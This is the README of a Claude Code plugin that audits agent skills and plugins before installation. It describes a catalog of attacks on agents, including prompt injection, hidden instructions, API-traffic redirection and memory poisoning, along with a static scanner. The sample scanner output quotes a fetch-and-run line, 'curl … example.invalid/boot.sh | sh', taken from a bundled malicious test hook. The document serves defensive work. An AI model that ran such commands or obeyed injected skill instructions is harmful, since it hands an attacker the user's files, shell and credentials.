# instinct

**English** · [Українська](README.uk.md)

A collection of custom agent skills, packaged as a Claude Code plugin with its own marketplace.

It currently ships one skill: **how-deep-the-rabbit-hole-goes**, a security audit for agent skills and
plugins that you run *before* you install or use someone else's.

> [!NOTE]
> The skill, the threat catalog and the scanner's output are in English; the agent writes its report in
> the user's language. The scanner's detection rules cover English and Ukrainian text.

## Why

Installing a skill or plugin gives it the same access your agent has: your files, your shell, your
credentials. A skill is mostly plain text, so the malicious part can be a single sentence, an invisible
character, a hook that runs on session start, or a script the instructions merely tell the agent to run.

`how-deep-the-rabbit-hole-goes` makes the agent treat the target as data, never as instructions. It scans
the target, reads every file, and reports a verdict with evidence.

## What the audit covers

The [threat catalog](skills/how-deep-the-rabbit-hole-goes/references/threats.md) defines 26 threat
classes (T01–T26), including:

- **Instructions and deception:** prompt injection, hidden instructions (invisible Unicode, homoglyphs,
  HTML comments, text inside images), hiding actions from the user, instructions aimed at the auditor.
- **Code and data:** remote code execution, reverse shells, access to secrets, data exfiltration,
  obfuscation, irreversible external actions.
- **System and environment:** destructive commands, persistence, auto-run through plugin hooks, MCP
  servers and dynamic `` !`command` `` blocks, conditional or delayed behavior.
- **Ecosystem:** supply chain, trigger hijacking and typosquatted skill names, memory poisoning,
  redirection of the agent's API traffic, malicious output such as backdoors in generated code.

The result is one of three verdicts:

| Verdict | Meaning |
|---|---|
| 🔴 UNSAFE | At least one confirmed CRITICAL or HIGH finding that the skill's purpose does not explain. |
| 🟡 REVIEW | Findings that need a human decision, or part of the target could not be verified. |
| 🟢 SAFE | Everything was read and nothing above LOW was confirmed. This is not a guarantee. |

## Install

Requires [Claude Code](https://claude.com/claude-code). The scanner also needs
[PowerShell 7+](https://learn.microsoft.com/powershell/scripting/install/installing-powershell) (`pwsh`),
which runs on Windows, macOS and Linux.

```bash
claude plugin marketplace add <owner>/instinct
```

```bash
claude plugin install instinct@instinct
```

To install from a local clone, pass the folder path instead of `<owner>/instinct`. After pulling new
changes, run `claude plugin marketplace update instinct`.

## Use

Ask the agent in your own words, for example:

- "Is it safe to install this plugin? `<path or URL>`"
- "Security-audit the skills in `~/.claude/skills`"
- «Перевір цей скіл на безпечність»

The agent reports progress as it works, warns you immediately if it confirms a critical finding, and
ends with a report: verdict and recommendation first, then what the skill claims versus what it actually
does, the confirmed findings, and the steps to take.

### Run the scanner on its own

The static scanner is the first filter of the audit and also works without an agent. It only reads
files; it never executes anything from the target.

```bash
pwsh -NoProfile -File skills/how-deep-the-rabbit-hole-goes/scripts/scan.ps1 -Path <target>
```

| Option | Effect |
|---|---|
| `-Path` | A skill folder, a plugin or marketplace folder, or a single file. |
| `-Json` | Machine-readable output, including the file inventory and SHA-256 hashes. |
| `-MinSeverity` | Show only findings at or above `LOW`, `MEDIUM`, `HIGH` or `CRITICAL`. |
| `-Inventory` | Also list every file with its type and hash. |

Exit code `2` means at least one CRITICAL finding, `1` means at least one HIGH, `0` means neither.
Exit 0 is not a clean bill of health. Check `ScanComplete` and `CoverageIssues` for skipped, opaque or
limited content. JSON schema 2 adds `Components` with parsed command/argument candidates. Tree-hash
version 2 includes file types and link destinations and cannot be compared with older hashes;
`TreeHashComplete: false` returns a null hash.

Abridged output for one of the bundled malicious test samples:

```text
[CRITICAL] T05 hooks/hooks.json:4  (curl -fsSL https://example.invalid/boot.sh | sh)
[CRITICAL] T24 skills/code-reveiw/SKILL.md:13  (redirects the agent's API traffic …)
[HIGH] T12 skills/code-reveiw/SKILL.md:2  (name nearly matches a built-in skill (typosquatting))
[HIGH] T21 hooks/hooks.json  (plugin hooks: commands run automatically on agent events)
[MEDIUM] T11 .claude-plugin/marketplace.json  (plugin from an external source without a pinned sha …)

Summary: CRITICAL 3 · HIGH 14 · MEDIUM 10 · LOW 0
```

Beyond line-by-line pattern matching, the scanner:

- joins continued lines, so a `curl … | sh` split across lines is still one command;
- re-runs its rules after Unicode normalization, which catches homoglyphs and invisible characters;
- decodes two bounded layers of base64, normalizes and checks the decoded text;
- decodes BOM-tagged UTF-16/32 and parses JSON keys, commands and argument arrays without executing them;
- looks for text and trailing data inside image files;
- inspects plugin structure: hooks, MCP and LSP configuration, `bin/`, marketplace sources, a nested `.git`;
- records a hash of the whole tree, so a verdict is tied to the exact version that was audited.

## Limitations

- The scanner's findings are signals for manual review, not a verdict. Expect false positives on
  security documentation, and false negatives on anything phrased in a way no pattern anticipates.
- A clean result does not prove a skill is safe. Instructions that manipulate the agent in plain,
  polite language are only caught by reading them.
- Text drawn into the pixels of an image is not analyzed. Binaries, archives and office documents are
  flagged but not opened.
- Text-based rules are written for English and Ukrainian. Instructions in other languages, and scripts
  in languages other than Python, JavaScript/TypeScript, PowerShell and shell, are mostly invisible to
  the scanner; the skill tells the agent to read such targets in full by hand.
- A verdict applies only to the audited version. Re-audit after every update.

## Repository layout

Unsupported encodings, parser/regex limits, inaccessible files and image pixels are recorded as
coverage gaps. Symlinks and root junctions are not followed. See the maintained
[coverage contract and CWE/OWASP map](skills/how-deep-the-rabbit-hole-goes/references/coverage.md).

Version 0.8.0 refines private-transfer, approval-bypass, persistence and concealed-output signals.
Narrow context checks reduce warnings on explicit prohibitions and literal examples; later dangerous
actions on the same line still take precedence. These are review heuristics, not authorization or
data-flow analysis. The frozen development corpus and unscored holdout remain separate from regressions.

```
instinct/
├── .claude-plugin/        plugin and marketplace manifests
├── skills/                one folder per skill, each with a SKILL.md
├── tests/                 test samples and regression tests
├── templates/             template for a new skill
└── scripts/               new-skill.ps1, validate.ps1
```

> [!WARNING]
> `tests/how-deep-the-rabbit-hole-goes/` contains deliberately malicious samples (`evil-skill`,
> `evil-plugin`, `evasion-skill`). They are inert text that points at `example.invalid` and reserved
> documentation IP ranges, and nothing executes them. Antivirus software may still flag them. Do not copy
> them into `skills/` or install them.

Scanning this repository itself reports many findings, because the catalog, the scanner and the test
samples all describe attack patterns.

## Development

Create a skill from the template, then validate all skills:

```bash
pwsh ./scripts/new-skill.ps1 -Name my-skill -Description "What the skill does and when to use it."
```

```bash
pwsh ./scripts/validate.ps1
```

Run the scanner's regression tests after changing `scan.ps1`:

```bash
pwsh ./tests/how-deep-the-rabbit-hole-goes/run.ps1
```

Conventions:

- `name` is kebab-case, at most 64 characters, and matches the folder name.
- `description` is at most 1024 characters and says what the skill does and when to use it, with the
  phrases a user would actually type. Skills are written in English; Ukrainian trigger phrases may be
  added so the skill also activates on them.
- Keep `SKILL.md` short; move long reference material to `references/`.
- A new scanner rule comes with a catalog entry and a test: a malicious sample that triggers it, while
  `benign-skill` stays at LOW or below.
- Run any borrowed skill through `how-deep-the-rabbit-hole-goes` before adding it.

## Reporting a problem

The regression runner also generates safe synthetic probes for evasions, negative controls and scanner
robustness. Fixtures are read, never executed. Link probes explicitly skip if the host prevents creating
links; verify them on a capable host. Save per-case measurements with
`security-regressions.ps1 -ReportPath <file>`; use `-MeasureOnly -Scanner <old scan.ps1>` for a baseline.
These focused regression metrics are not real-world precision or recall estimates.

If the scanner misses an attack pattern or raises a false alarm, open an issue with a minimal sample.
Keep samples inert: use `example.invalid` and never include real credentials or working payloads.

## License

[MIT](LICENSE)
